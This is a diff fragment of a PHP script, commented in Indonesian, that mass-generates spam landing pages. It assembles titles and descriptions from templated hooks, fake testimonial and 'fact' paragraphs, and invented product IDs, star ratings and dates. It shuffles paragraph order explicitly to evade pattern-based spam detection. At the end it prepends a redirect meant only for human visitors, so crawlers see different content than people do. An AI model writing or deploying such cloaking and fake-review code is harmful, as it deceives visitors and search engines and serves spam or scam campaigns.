+$_selEmosi      = $_emosi[abs(crc32($_tdSeed . 'emo')) % 50];
+
+// Step 3b: Pilih connector variables (kata penghubung dinamis)
+$_selVLihat     = $_v_lihat[abs(crc32($_tdSeed . 'vl')) % 45];
+$_selVAkses     = $_v_akses[abs(crc32($_tdSeed . 'va')) % 45];
+$_selVSajikan   = $_v_sajikan[abs(crc32($_tdSeed . 'vs')) % 45];
+$_selPSebagai   = $_p_sebagai[abs(crc32($_tdSeed . 'psb')) % 45];
+$_selPYang      = $_p_yang[abs(crc32($_tdSeed . 'py')) % 45];
+$_selPDi        = $_p_di[abs(crc32($_tdSeed . 'pdi')) % 45];
+$_selPTentang   = $_p_tentang[abs(crc32($_tdSeed . 'ptg')) % 45];
+$_selKonek      = $_konek[abs(crc32($_tdSeed . 'knk')) % 45];
+$_selKonek2     = $_konek2[abs(crc32($_tdSeed . 'kn2')) % 45];
+$_selKual       = $_kual[abs(crc32($_tdSeed . 'kl')) % 45];
+
+if ($_kategori === 0) {
+    $_selHook   = $_hooks_konteks[abs(crc32($_tdSeed . 'hook')) % 50];
+    $_rawTitle  = $_titles_konteks[$_tplIdx];
+} else {
+    $_selHook   = $_hooks_instruksi[abs(crc32($_tdSeed . 'hook')) % 50];
+    $_rawTitle  = $_titles_instruksi[$_tplIdx];
+}
+
+// Step 3c: Assemble desc — VARIABLE paragraph count + order shuffling (anti-pattern detection)
+// 7 pool paragraf tersedia: P1(Opening), P2(Exposition), P3(Value), P4(Features), P5(CTA), P6(Testimoni), P7(Fakta)
+// Hash menentukan: berapa paragraf (3-7) dan urutan mana yang dipakai
+
+$_p1Idx = abs(crc32($_tdSeed . 'dp1')) % 49;
+$_p2Idx = abs(crc32($_tdSeed . 'dp2')) % 49;
+$_p3Idx = abs(crc32($_tdSeed . 'dp3')) % 49;
+$_p4Idx = abs(crc32($_tdSeed . 'dp4')) % 49;
+$_p5Idx = abs(crc32($_tdSeed . 'dp5')) % 49;
+$_p6Idx = abs(crc32($_tdSeed . 'dp6')) % 45;
+$_p7Idx = abs(crc32($_tdSeed . 'dp7')) % 45;
+
+// Ambil semua paragraf
+$_allParagraphs = array(
+    $_desc_p1[$_p1Idx], $_desc_p2[$_p2Idx], $_desc_p3[$_p3Idx],
+    $_desc_p4[$_p4Idx], $_desc_p5[$_p5Idx], $_desc_p6[$_p6Idx], $_desc_p7[$_p7Idx],
+);
+
+// Pilih jumlah paragraf: 3, 4, 5, 6, atau 7 (weighted: 5 paling sering)
+$_paraCountOptions = array(3, 4, 4, 5, 5, 5, 5, 5, 6, 6, 6, 7);
+$_paraCount = $_paraCountOptions[abs(crc32($_tdSeed . 'pcount')) % 12];
+
+// 20 preset paragraph orders (index 0-6 = P1-P7) — variasi struktur cerita
+$_orderPresets = array(
+    array(0,1,2,3,4),       // Classic: Opening→Expo→Value→Feature→CTA
+    array(0,2,1,3,4),       // Opening→Value→Expo→Feature→CTA
+    array(5,0,1,2,4),       // Testimoni→Opening→Expo→Value→CTA
+    array(6,0,1,3,4),       // Fakta→Opening→Expo→Feature→CTA
+    array(0,1,5,2,4),       // Opening→Expo→Testimoni→Value→CTA
+    array(0,6,1,2,4),       // Opening→Fakta→Expo→Value→CTA
+    array(0,1,2,5,4),       // Opening→Expo→Value→Testimoni→CTA
+    array(0,1,2,6,4),       // Opening→Expo→Value→Fakta→CTA
+    array(5,0,6,2,4),       // Testimoni→Opening→Fakta→Value→CTA
+    array(6,5,0,1,4),       // Fakta→Testimoni→Opening→Expo→CTA
+    array(0,1,3,2,4),       // Opening→Expo→Feature→Value→CTA
+    array(0,3,1,5,4),       // Opening→Feature→Expo→Testimoni→CTA
+    array(0,1,2,3,5,4),     // 6-para: +Testimoni before CTA
+    array(0,1,6,2,3,4),     // 6-para: +Fakta in middle
+    array(5,0,1,2,3,4),     // 6-para: Testimoni first
+    array(0,1,2,5,6,4),     // 6-para: Testimoni+Fakta before CTA
+    array(0,1,2,3,5,6,4),   // 7-para: Full classic + Testimoni + Fakta
+    array(5,0,1,6,2,3,4),   // 7-para: Testimoni first, Fakta mid
+    array(0,6,1,5,2,3,4),   // 7-para: Fakta early, Testimoni mid
+    array(0,1,2,6,3,5,4),   // 7-para: Fakta+Testimoni scattered
+);
+
+// Filter presets yang cocok dengan jumlah paragraf terpilih
+$_matchingOrders = array();
+foreach ($_orderPresets as $_preset) {
+    if (count($_preset) === $_paraCount) {
+        $_matchingOrders[] = $_preset;
+    }
+}
+// Fallback: jika tidak ada yang cocok (3 atau 4 paragraf), trim dari preset 5-paragraf
+if (empty($_matchingOrders)) {
+    foreach ($_orderPresets as $_preset) {
+        if (count($_preset) === 5) {
+            $_matchingOrders[] = array_slice($_preset, 0, $_paraCount);
+        }
+    }
+}
+
+// Pilih order berdasarkan hash
+$_orderIdx = abs(crc32($_tdSeed . 'pord')) % count($_matchingOrders);
+$_selectedOrder = $_matchingOrders[$_orderIdx];
+
+// Assemble paragraf sesuai order terpilih
+$_descParts = array();
+foreach ($_selectedOrder as $_pi) {
+    $_descParts[] = $_allParagraphs[$_pi];
+}
+$_rawDesc = implode(' ', $_descParts);
+
+// Step 4: Replace template placeholders
+$_titleDescReplace = array(
+    '{$BRANDS}' => $BRANDS,
+    '{$BRAND}'  => $BRAND,
+    '{$E}'      => $randomEmoji,
+    '{$M}'      => $randomEmoji,
+    '{$W}'      => $randomWord,
+    '{$HOOK}'   => $_selHook,
+    '{$SUBJECT}'=> $_selSubject,
+    '{$ACTION}' => $_selAction,
+    '{$PLACE}'  => $_selPlace,
+    '{$PROF}'   => $_selProf,
+    '{$CTA}'    => $_selCta,
+    '{$URGENCY}'=> $_selUrgency,
+    '{$SOCIAL}' => $_selSocial,
+    '{$TONE}'   => $_selTone,
+    '{$ADJ}'    => $_selAdj,
+    '{$TAG}'    => $_selTag,
+    '{$PLATFORM}'=> $_selPlatform,
+    '{$AUDIENCE}'=> $_selAudience,
+    '{$V_LIHAT}'  => $_selVLihat,
+    '{$V_AKSES}'  => $_selVAkses,
+    '{$V_SAJIKAN}'=> $_selVSajikan,
+    '{$P_SEBAGAI}'=> $_selPSebagai,
+    '{$P_YANG}'   => $_selPYang,
+    '{$P_DI}'     => $_selPDi,
+    '{$P_TENTANG}'=> $_selPTentang,
+    '{$KONEK}'    => $_selKonek,
+    '{$KONEK2}'   => $_selKonek2,
+    '{$KUAL}'     => $_selKual,
+    '{$WAKTU}'    => $_selWaktu,
+    '{$ANGKA}'    => $_selAngka,
+    '{$EMOSI}'    => $_selEmosi,
+);
+
+$title = str_replace(array_keys($_titleDescReplace), array_values($_titleDescReplace), $_rawTitle);
+$desc  = str_replace(array_keys($_titleDescReplace), array_values($_titleDescReplace), $_rawDesc);
+
+// Cleanup: hapus spasi ganda
+$title = preg_replace('/\s+/', ' ', trim($title));
+$desc  = preg_replace('/\s+/', ' ', trim($desc));
+
+$randomProductId = 10000 + (abs(crc32($domainSeed . 'pid')) % 90000);
+$randomRating = number_format((41 + abs(crc32($domainSeed . 'rat')) % 9) / 10, 1);
+$_mHash = abs(crc32($domainSeed . 'rdate'));
+$randomDate = '2026-' . str_pad(1 + ($_mHash % 12), 2, '0', STR_PAD_LEFT) . '-' . str_pad(1 + (abs(crc32($domainSeed . 'rday')) % 28), 2, '0', STR_PAD_LEFT);
+
+$appCategories = array(
+    'GameApplication',
+    'EntertainmentApplication',
+    'SocialNetworkingApplication',
+    'MultimediaApplication',
+    'VideoApplication',
+    'NewsApplication',
+    'LifestyleApplication',
+    'HealthApplication',
+    'TravelApplication',
+    'ShoppingApplication',
+);
+$randomAppCategory = $appCategories[abs(crc32($domainSeed . 'appcat')) % 10];
+
+$catPrefixes = array('Android Game', 'Aplikasi', 'Hiburan', 'Pemutar & Editor Video', 'Sosial', 'Gaya Hidup');
+$randomcategory = $catPrefixes[abs(crc32($domainSeed . 'catpfx')) % 6] . ' < ' . ucwords($words[abs(crc32($domainSeed . 'catw1')) % 128]) . ' < ' . ucwords($words[abs(crc32($domainSeed . 'catw2')) % 128]);
+
+// ─── Replace Placeholders ─────────────────────────────────────────────────────
+$output = str_replace(
+    array('{$BRANDS}', '{$BRAND}', '{$randomWord}', '{$randomEmoji}', '{$randomImg}', '{$randomImg1}', '{$randomImg2}', '{$randomImg3}', '{$randomImg4}', '{$randomImg5}', '{$randomLokasi}', '{BRANDS}', '{BRAND}', '{randomWord}', '{randomEmoji}', '{randomImg}', '{randomImg1}', '{randomImg2}', '{randomImg3}', '{randomImg4}', '{randomImg5}', '{randomLokasi}', '{title}', '{desc}', '{urlPath}', '{timestamp}', '{NUMLIST}', '{randomproductid}', '{randomrating}', '{randomdate}', '{randomAppCategory}', '{randomcategory}'),
+    array($BRAND,     $BRAND,     $randomWord,     $randomEmoji,     $randomImg,     $randomImg1,     $randomImg2,     $randomImg3,     $randomImg4,     $randomImg5,     $randomLokasi,     $BRAND,    $BRAND,    $randomWord,    $randomEmoji,    $randomImg,    $randomImg1,    $randomImg2,    $randomImg3,    $randomImg4,    $randomImg5,    $randomLokasi,    $title,    $desc,    $urlPath,    $timestamp,    $NUMLIST,    $randomProductId,    $randomRating,    $randomDate,    $randomAppCategory,    $randomcategory),
+    $htmlContent
+);
+
+// ─── Inject redirect di atas <!DOCTYPE html> (hanya untuk manusia) ─────────────
+if ($redirectTag !== '') {
+    $output = $redirectTag . "\n" . $output;
+}
+echo $output;
+exit;
